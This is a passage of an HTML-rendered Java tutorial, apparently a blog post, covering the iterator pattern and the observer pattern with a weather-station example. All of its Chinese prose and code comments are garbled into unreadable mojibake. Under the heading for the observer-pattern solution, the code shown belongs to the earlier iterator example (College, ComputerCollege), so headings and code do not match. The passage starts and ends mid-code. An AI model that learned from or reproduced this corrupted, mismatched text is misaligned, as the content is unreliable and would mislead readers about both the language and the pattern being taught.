å­¦é™¢è¾“å‡º ç³»</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printDepartment</span><span class="hljs-params">(Iterator iterator)</span> &#123;<br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-type">Department</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (Department)iterator.next();<br>         System.out.println(d.getName());<br>      &#125;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">=== è®¡ç®—æœºå­¦é™¢=====</span><br>Javaä¸“ä¸š<br>PHPä¸“ä¸š<br>å¤§æ•°æ®ä¸“ä¸š<br><span class="hljs-section">=== ä¿¡æ¯å·¥ç¨‹å­¦é™¢=====</span><br>ä¿¡æ¯å®‰å…¨ä¸“ä¸š<br>ç½‘ç»œå®‰å…¨ä¸“ä¸š<br>æœåŠ¡å™¨å®‰å…¨ä¸“ä¸š<br></code></pre></td></tr></table></figure><h2 id="è¿­ä»£å™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#è¿­ä»£å™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> è¿­ä»£å™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li>ä¼˜ç‚¹</li></ol><ul><li><p>æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ–¹æ³•éå†å¯¹è±¡ï¼Œå®¢æˆ·ä¸ç”¨å†è€ƒè™‘èšåˆçš„ç±»å‹ï¼Œä½¿ç”¨ä¸€ç§æ–¹æ³•å°±å¯ä»¥éå†å¯¹è±¡äº†ã€‚</p></li><li><p>éšè—äº†èšåˆçš„å†…éƒ¨ç»“æ„ï¼Œå®¢æˆ·ç«¯è¦éå†èšåˆçš„æ—¶å€™åªèƒ½å–åˆ°è¿­ä»£å™¨ï¼Œè€Œä¸ä¼šçŸ¥é“èšåˆçš„å…·ä½“ç»„æˆã€‚</p></li><li><p>æä¾›äº†ä¸€ç§<strong>è®¾è®¡æ€æƒ³</strong>ï¼Œå°±æ˜¯ä¸€ä¸ªç±»åº”è¯¥åªæœ‰ä¸€ä¸ªå¼•èµ·å˜åŒ–çš„åŸå› ï¼ˆå«åšå•ä¸€è´£ä»»åŸåˆ™ï¼‰ã€‚åœ¨èšåˆç±»ä¸­ï¼Œæˆ‘ä»¬æŠŠè¿­ä»£å™¨åˆ†å¼€ï¼Œå°±æ˜¯è¦æŠŠ<strong>ç®¡ç†å¯¹è±¡é›†åˆ</strong>å’Œ<strong>éå†å¯¹è±¡é›†åˆ</strong>çš„è´£ä»»åˆ†å¼€ï¼Œè¿™æ ·ä¸€æ¥é›†åˆæ”¹å˜çš„è¯ï¼Œåªå½±å“åˆ°èšåˆå¯¹è±¡ã€‚è€Œå¦‚æœéå†æ–¹å¼æ”¹å˜çš„è¯ï¼Œåªå½±å“åˆ°äº†è¿­ä»£å™¨ã€‚</p></li><li><p>å½“è¦å±•ç¤ºä¸€ç»„ç›¸ä¼¼å¯¹è±¡ï¼Œæˆ–è€…éå†ä¸€ç»„ç›¸åŒå¯¹è±¡æ—¶ä½¿ç”¨, é€‚åˆä½¿ç”¨è¿­ä»£å™¨æ¨¡å¼</p></li></ul><ol start="2"><li>ç¼ºç‚¹<ul><li>æ¯ä¸ªèšåˆå¯¹è±¡éƒ½è¦ä¸€ä¸ªè¿­ä»£å™¨ï¼Œä¼šç”Ÿæˆå¤šä¸ªè¿­ä»£å™¨ä¸å¥½ç®¡ç†ç±»</li></ul></li></ol><h1 id="è§‚å¯Ÿè€…æ¨¡å¼"><a class="markdownIt-Anchor" href="#è§‚å¯Ÿè€…æ¨¡å¼"></a> <mark>è§‚å¯Ÿè€…æ¨¡å¼</mark></h1><p>å½“å¯¹è±¡é—´å­˜åœ¨ä¸€å¯¹å¤šå…³ç³»æ—¶ï¼Œåˆ™ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰ã€‚æ¯”å¦‚ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«ä¿®æ”¹æ—¶ï¼Œåˆ™ä¼šè‡ªåŠ¨é€šçŸ¥ä¾èµ–å®ƒçš„å¯¹è±¡ã€‚è§‚å¯Ÿè€…æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-16"><a class="markdownIt-Anchor" href="#ä»‹ç»-16"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å®šä¹‰å¯¹è±¡é—´çš„ä¸€ç§ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºå®ƒçš„å¯¹è±¡éƒ½å¾—åˆ°é€šçŸ¥å¹¶è¢«è‡ªåŠ¨æ›´æ–°ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ä¸€ä¸ªå¯¹è±¡çŠ¶æ€æ”¹å˜ç»™å…¶ä»–å¯¹è±¡é€šçŸ¥çš„é—®é¢˜ï¼Œè€Œä¸”è¦è€ƒè™‘åˆ°æ˜“ç”¨å’Œä½è€¦åˆï¼Œä¿è¯é«˜åº¦çš„åä½œã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> ä¸€ä¸ªå¯¹è±¡ï¼ˆç›®æ ‡å¯¹è±¡ï¼‰çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œæ‰€æœ‰çš„ä¾èµ–å¯¹è±¡ï¼ˆè§‚å¯Ÿè€…å¯¹è±¡ï¼‰éƒ½å°†å¾—åˆ°é€šçŸ¥ï¼Œè¿›è¡Œå¹¿æ’­é€šçŸ¥ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> ä½¿ç”¨é¢å‘å¯¹è±¡æŠ€æœ¯ï¼Œå¯ä»¥å°†è¿™ç§ä¾èµ–å…³ç³»å¼±åŒ–ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> åœ¨æŠ½è±¡ç±»é‡Œæœ‰ä¸€ä¸ª ArrayList å­˜æ”¾è§‚å¯Ÿè€…ä»¬ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€æ‹å–çš„æ—¶å€™ï¼Œæ‹å–å¸ˆè§‚å¯Ÿæœ€é«˜æ ‡ä»·ï¼Œç„¶åé€šçŸ¥ç»™å…¶ä»–ç«ä»·è€…ç«ä»·ã€‚<br />2ã€è¥¿æ¸¸è®°é‡Œé¢æ‚Ÿç©ºè¯·æ±‚è©è¨é™æœçº¢å­©å„¿ï¼Œè©è¨æ´’äº†ä¸€åœ°æ°´æ‹›æ¥ä¸€ä¸ªè€ä¹Œé¾Ÿï¼Œè¿™ä¸ªä¹Œé¾Ÿå°±æ˜¯è§‚å¯Ÿè€…ï¼Œä»–è§‚å¯Ÿè©è¨æ´’æ°´è¿™ä¸ªåŠ¨ä½œã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€è§‚å¯Ÿè€…å’Œè¢«è§‚å¯Ÿè€…æ˜¯æŠ½è±¡è€¦åˆçš„ã€‚ 2ã€å»ºç«‹ä¸€å¥—è§¦å‘æœºåˆ¶ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€å¦‚æœä¸€ä¸ªè¢«è§‚å¯Ÿè€…å¯¹è±¡æœ‰å¾ˆå¤šçš„ç›´æ¥å’Œé—´æ¥çš„è§‚å¯Ÿè€…çš„è¯ï¼Œå°†æ‰€æœ‰çš„è§‚å¯Ÿè€…éƒ½é€šçŸ¥åˆ°ä¼šèŠ±è´¹å¾ˆå¤šæ—¶é—´ã€‚2ã€å¦‚æœåœ¨è§‚å¯Ÿè€…å’Œè§‚å¯Ÿç›®æ ‡ä¹‹é—´æœ‰å¾ªç¯ä¾èµ–çš„è¯ï¼Œè§‚å¯Ÿç›®æ ‡ä¼šè§¦å‘å®ƒä»¬ä¹‹é—´è¿›è¡Œå¾ªç¯è°ƒç”¨ï¼Œå¯èƒ½å¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚3ã€è§‚å¯Ÿè€…æ¨¡å¼æ²¡æœ‰ç›¸åº”çš„æœºåˆ¶è®©è§‚å¯Ÿè€…çŸ¥é“æ‰€è§‚å¯Ÿçš„ç›®æ ‡å¯¹è±¡æ˜¯æ€ä¹ˆå‘ç”Ÿå˜åŒ–çš„ï¼Œè€Œä»…ä»…åªæ˜¯çŸ¥é“è§‚å¯Ÿç›®æ ‡å‘ç”Ÿäº†å˜åŒ–ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p><ul><li>ä¸€ä¸ªæŠ½è±¡æ¨¡å‹æœ‰ä¸¤ä¸ªæ–¹é¢ï¼Œå…¶ä¸­ä¸€ä¸ªæ–¹é¢ä¾èµ–äºå¦ä¸€ä¸ªæ–¹é¢ã€‚å°†è¿™äº›æ–¹é¢å°è£…åœ¨ç‹¬ç«‹çš„å¯¹è±¡ä¸­ä½¿å®ƒä»¬å¯ä»¥å„è‡ªç‹¬ç«‹åœ°æ”¹å˜å’Œå¤ç”¨ã€‚</li><li>ä¸€ä¸ªå¯¹è±¡çš„æ”¹å˜å°†å¯¼è‡´å…¶ä»–ä¸€ä¸ªæˆ–å¤šä¸ªå¯¹è±¡ä¹Ÿå‘ç”Ÿæ”¹å˜ï¼Œè€Œä¸çŸ¥é“å…·ä½“æœ‰å¤šå°‘å¯¹è±¡å°†å‘ç”Ÿæ”¹å˜ï¼Œå¯ä»¥é™ä½å¯¹è±¡ä¹‹é—´çš„è€¦åˆåº¦ã€‚</li><li>ä¸€ä¸ªå¯¹è±¡å¿…é¡»é€šçŸ¥å…¶ä»–å¯¹è±¡ï¼Œè€Œå¹¶ä¸çŸ¥é“è¿™äº›å¯¹è±¡æ˜¯è°ã€‚</li><li>éœ€è¦åœ¨ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘é“¾ï¼ŒAå¯¹è±¡çš„è¡Œä¸ºå°†å½±å“Bå¯¹è±¡ï¼ŒBå¯¹è±¡çš„è¡Œä¸ºå°†å½±å“Cå¯¹è±¡â€¦â€¦ï¼Œå¯ä»¥ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼åˆ›å»ºä¸€ç§é“¾å¼è§¦å‘æœºåˆ¶ã€‚</li></ul><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> 1ã€JAVA ä¸­å·²ç»æœ‰äº†å¯¹è§‚å¯Ÿè€…æ¨¡å¼çš„æ”¯æŒç±»ã€‚ 2ã€é¿å…å¾ªç¯å¼•ç”¨ã€‚ 3ã€å¦‚æœé¡ºåºæ‰§è¡Œï¼ŒæŸä¸€è§‚å¯Ÿè€…é”™è¯¯ä¼šå¯¼è‡´ç³»ç»Ÿå¡å£³ï¼Œä¸€èˆ¬é‡‡ç”¨å¼‚æ­¥æ–¹å¼ã€‚</p><h2 id="å®ç°-14"><a class="markdownIt-Anchor" href="#å®ç°-14"></a> å®ç°</h2><h3 id="å¤©æ°”é¢„æŠ¥è®¾è®¡æ–¹æ¡ˆ-1-æ™®é€šæ–¹æ¡ˆ"><a class="markdownIt-Anchor" href="#å¤©æ°”é¢„æŠ¥è®¾è®¡æ–¹æ¡ˆ-1-æ™®é€šæ–¹æ¡ˆ"></a> å¤©æ°”é¢„æŠ¥è®¾è®¡æ–¹æ¡ˆ 1-æ™®é€šæ–¹æ¡ˆ</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104142333771.png" alt="image-20230104142333771" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.observer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//åˆ›å»ºæ¥å…¥æ–¹ currentConditions</span><br>      <span class="hljs-type">CurrentConditions</span> <span class="hljs-variable">currentConditions</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CurrentConditions</span>();<br>      <span class="hljs-comment">//åˆ›å»º WeatherData å¹¶å°† æ¥å…¥æ–¹ currentConditions ä¼ é€’åˆ° WeatherDataä¸­</span><br>      <span class="hljs-type">WeatherData</span> <span class="hljs-variable">weatherData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeatherData</span>(currentConditions);<br>      <br>      <span class="hljs-comment">//æ›´æ–°å¤©æ°”æƒ…å†µ</span><br>      weatherData.setData(<span class="hljs-number">30</span>, <span class="hljs-number">150</span>, <span class="hljs-number">40</span>);<br>      <br>      <span class="hljs-comment">//å¤©æ°”æƒ…å†µå˜åŒ–</span><br>      System.out.println(<span class="hljs-string">&quot;============å¤©æ°”æƒ…å†µå˜åŒ–=============&quot;</span>);<br>      weatherData.setData(<span class="hljs-number">40</span>, <span class="hljs-number">160</span>, <span class="hljs-number">20</span>);<br>      <br><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>CurrentConditions.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.observer;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ˜¾ç¤ºå½“å‰å¤©æ°”æƒ…å†µï¼ˆå¯ä»¥ç†è§£æˆæ˜¯æ°”è±¡ç«™è‡ªå·±çš„ç½‘ç«™ï¼‰</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentConditions</span> &#123;<br>    <span class="hljs-comment">// æ¸©åº¦ï¼Œæ°”å‹ï¼Œæ¹¿åº¦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> temperature;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> pressure;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> humidity;<br><br>    <span class="hljs-comment">//æ›´æ–° å¤©æ°”æƒ…å†µï¼Œæ˜¯ç”± WeatherData æ¥è°ƒç”¨ï¼Œæˆ‘ä½¿ç”¨æ¨é€æ¨¡å¼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">float</span> temperature, <span class="hljs-type">float</span> pressure, <span class="hljs-type">float</span> humidity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.temperature = temperature;<br>        <span class="hljs-built_in">this</span>.pressure = pressure;<br>        <span class="hljs-built_in">this</span>.humidity = humidity;<br>        display();<br>    &#125;<br><br>    <span class="hljs-comment">//æ˜¾ç¤º</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;***Today mTemperature: &quot;</span> + temperature + <span class="hljs-string">&quot;***&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;***Today mPressure: &quot;</span> + pressure + <span class="hljs-string">&quot;***&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;***Today mHumidity: &quot;</span> + humidity + <span class="hljs-string">&quot;***&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>WeatherData.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.observer;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ç±»æ˜¯æ ¸å¿ƒ</span><br><span class="hljs-comment"> * 1. åŒ…å«æœ€æ–°çš„å¤©æ°”æƒ…å†µä¿¡æ¯ </span><br><span class="hljs-comment"> * 2. å«æœ‰ CurrentConditions å¯¹è±¡</span><br><span class="hljs-comment"> * 3. å½“æ•°æ®æœ‰æ›´æ–°æ—¶ï¼Œå°±ä¸»åŠ¨çš„è°ƒç”¨   CurrentConditionså¯¹è±¡updateæ–¹æ³•(å« display), è¿™æ ·ä»–ä»¬ï¼ˆæ¥å…¥æ–¹ï¼‰å°±çœ‹åˆ°æœ€æ–°çš„ä¿¡æ¯</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WeatherData</span> &#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> temperatrue;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> pressure;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> humidity;<br>   <span class="hljs-keyword">private</span> CurrentConditions currentConditions;<br>   <span class="hljs-comment">//åŠ å…¥æ–°çš„ç¬¬ä¸‰æ–¹</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">WeatherData</span><span class="hljs-params">(CurrentConditions currentConditions)</span> &#123;<br>      <span class="hljs-built_in">this</span>.currentConditions = currentConditions;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getTemperature</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> temperatrue;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getPressure</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> pressure;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getHumidity</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> humidity;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataChange</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">//è°ƒç”¨ æ¥å…¥æ–¹çš„ update</span><br>      currentConditions.update(getTemperature(), getPressure(), getHumidity());<br>   &#125;<br><br>   <span class="hljs-comment">//å½“æ•°æ®æœ‰æ›´æ–°æ—¶ï¼Œå°±è°ƒç”¨ setData</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(<span class="hljs-type">float</span> temperature, <span class="hljs-type">float</span> pressure, <span class="hljs-type">float</span> humidity)</span> &#123;<br>      <span class="hljs-built_in">this</span>.temperatrue = temperature;<br>      <span class="hljs-built_in">this</span>.pressure = pressure;<br>      <span class="hljs-built_in">this</span>.humidity = humidity;<br>      <span class="hljs-comment">//è°ƒç”¨dataChangeï¼Œ å°†æœ€æ–°çš„ä¿¡æ¯ æ¨é€ç»™ æ¥å…¥æ–¹ currentConditions</span><br>      dataChange();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">**<span class="hljs-emphasis">*Today mTemperature: 30.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mPressure: 150.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mHumidity: 40.0*</span>**</span><br>============å¤©æ°”æƒ…å†µå˜åŒ–=============<br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mTemperature: 40.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mPressure: 160.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mHumidity: 20.0*</span>**</span><br></code></pre></td></tr></table></figure><h3 id="è§‚å¯Ÿè€…æ¨¡å¼è§£å†³å¤©æ°”é¢„æŠ¥éœ€æ±‚"><a class="markdownIt-Anchor" href="#è§‚å¯Ÿè€…æ¨¡å¼è§£å†³å¤©æ°”é¢„æŠ¥éœ€æ±‚"></a> è§‚å¯Ÿè€…æ¨¡å¼è§£å†³å¤©æ°”é¢„æŠ¥éœ€æ±‚</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104143905498.png" alt="image-20230104143905498" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * ç›¸å½“äºä¸€ä¸ªå¤§å­¦</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        List&lt;College&gt; collegeList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;College&gt;();<br><br>        <span class="hljs-comment">//åˆ›å»ºå­¦é™¢</span><br>        <span class="hljs-type">ComputerCollege</span> <span class="hljs-variable">computerCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollege</span>();<br>        <span class="hljs-type">InfoCollege</span> <span class="hljs-variable">infoCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoCollege</span>();<br><br>        collegeList.add(computerCollege);<br>        collegeList.add(infoCollege);<br><br>        <span class="hljs-type">OutPutImpl</span> <span class="hljs-variable">outPutImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutPutImpl</span>(collegeList);<br>        outPutImpl.printCollege();<br><br>    &#125;<br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>College.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">College</span> &#123;<br>   <br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//å¢åŠ ç³»çš„æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span>;<br>   <br>   <span class="hljs-comment">//è¿”å›ä¸€ä¸ªè¿­ä»£å™¨,éå†</span><br>   <span class="hljs-keyword">public</span> Iterator  <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">numOfDepartment</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> ;<span class="hljs-comment">// ä¿å­˜å½“å‰æ•°ç»„çš„å¯¹è±¡ä¸ªæ•°</span><br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollege</span><span class="hljs-params">()</span> &#123;<br>      departments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>[<span class="hljs-number">5</span>];<br>      addDepartment(<span class="hljs-string">&quot;Javaä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; Javaä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;PHPä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; PHPä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;å¤§æ•°æ®ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; å¤§æ•°æ®ä¸“ä¸š &quot;</span>);<br>      <br>   &#125;<br>   <br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// 